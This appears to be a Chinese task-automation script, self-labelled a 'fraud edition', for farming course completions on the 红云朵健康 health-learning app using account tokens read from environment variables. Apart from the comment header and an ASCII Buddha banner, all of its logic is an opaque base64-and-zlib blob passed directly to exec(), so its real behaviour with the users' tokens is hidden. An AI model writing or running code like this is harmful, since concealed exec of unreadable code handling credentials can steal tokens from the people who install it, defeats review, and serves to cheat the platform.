
# 笨笨诈骗版 红云朵健康
# 有问题请及时联系笨笨 v:Bbvip666a （有其他想要的脚本也可以联系，尽量试着写一写）
# 环境变量 HongYunDuoUser   多账号使用换行分割  账号格式： token 一行一个
# 环境变量 HongYunDuoTask  写任务id  任务id提取方式如下
# 例如:今日连接为 https://mp-bjz4-07.ghstatic.cn/pages/courseModules/studyPages/index?adjustCode=RgxcXSid8g&courseCurriculumWareId=18074&assignDomain=1&courseCurriculumId=568
# 那么 今日得课程id 就是18074
#
#
# Expecting value: line 1 column 1 (char 0) 报错请求频繁 过段时间重试即可
#
#   --------------------------------祈求区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \| |// `.
#                / \||| : |||// #              / _||||| -:- |||||- #                | | \\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
#
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------

import zlib
import base64
exec(zlib.decompress(base64.b64decode("eJylVu1v00YY/96/4uQvSVBiO01IWlfRVMK6VtAiaKds6irLtS/JUfvO3J0pbZQv016gGusHNooYQisb24cNxiQktFXjr8Fp+S92Z+fFaUJLN0dR4nt+z+957nm7Q55PKAcceXACxf8J6/2j8EYAGe+/X2cET0zYrsUYuBZgYwKIx4F1YJoII26aaQbdehZwsgGx+LHYhomcTIyTjxSr3WVQ6QGOiaWyFMrfYVETWg6kQtZKzRPGUwZIWT5SG82SpdrES2VBqkowhjZHBEvpBoR+znLRTShltosg5vMRyZLlQYngxK5GyxLgU3JdKFeJE8k2izc2+K1iUYpmA94kFG1bXeqBq0L4MYM0N9uQLEJtkWwj17W086oO0jWEHbLJwNIKyOuqPgPEQqk4A26Vihkw6/surMH1S4hr5wtltVAC6UvzK4uXs8BFGxB8BO0NkgHVJiUe1PKTk6ouP2DZqlsU9VSWIF/Z8qFWW5hbAIvIpmQRMgZxA1KtLPCTupovT+XT+q1SWdfzxcKFDOi6VYN20+JSUtCndbtQyIBPah9e0PL581N5MOcGsBtTLvaWk1bimPsusqNIaLIkovjYNvSj7Z/TzsmFKxQ1UJSEJuc+MzTN83Pr17eLOb0sMsa40LdVO1JehnZuDnK7mVtGPDIhNsFYjsm3IfliNzU2oWxYchHGBQE9n29J0TVYhxTS0z3QBv7nLlu4EViNyMZ2M1ddym43Z25UdHU61e5Xu0PMBuTdWg+omyhwCplPMIOiRnvNo0qsQFXENwviEmaVRD1nEto8oLhPosrgpjMTScO+qPvYckTnWNw6xXyk0bcvFSqSV3UCz2fpiOD/uyU7OXIr4YywJ/yo96OfbFXNJgFlsBpQiuzADbzlYF223gKuE004TreqxwA1i8IE6IPjBFK+4FRayRHTTo2LTITo5lBmbzBjYno5GqIAxhqrioyRsraqsIH5y4hxsaQPVqWWstbnGudewv0F5wwWTuUasZtAXPFln0q2M1scy5KwVScUiA71AMIn2R1UhHxQPdKRNigVuDnXaihroFIB+WHgKVGM+aM49vhOxSZ89ynCPF1X3hzsdPaehj88Pnz23du952+fPDBaiYy2s51nPx3uPxfSzv5t5Bit9zDTVgY1JQ9WlbniHEpPZo61hnLmzhCeeYgnVpQ+5TpxtuTJODYOYuvG0OGbBcoQVyK/BlgdyUNrZEU+71GYxumNkD2Rp5+6E5l6qOy7/ByUmnFSqY6ot9dGl06aKWOGrUxMZqTuZLk9eXB4cK/z+JHR6jElK+e/1ogYa/I+MovZJqQnjcr8lF4uKmeakB7BcGvsHKFw06LOrEcCzMe02dG3r8Ld++HtF+HrvfDp/XDnT6MVkckdTyB5g8Si3UxTDoKUaXoWwqaZiidCILbDhFXCVIhvIioOL+mZMk9w49MAXwyI3HA3dIPb5bvhKwLThfccDL+8e/Tyr6MvHnYe/R7e/urN379dvXr4+mejVJwql6YLU6Vj+P6Gjl7+Eu6+6nz/4u3Xu0bLhTgduZtpZ+PR8ubgINzZl5Ojdyh1mcSmI2TiwJSvphuP6uhFZeKmJVz/DCcKQ45dKTXjm7IYvgPF4RFKA3mRFjf19AA/uJarvXM7M6Q0OrGgy6BxLKVK+M+98M7dzsPPO3s/xjEId//o3Pn1aP8bJfMv3mMqdg==".encode('utf-8'))).decode('utf-8'))
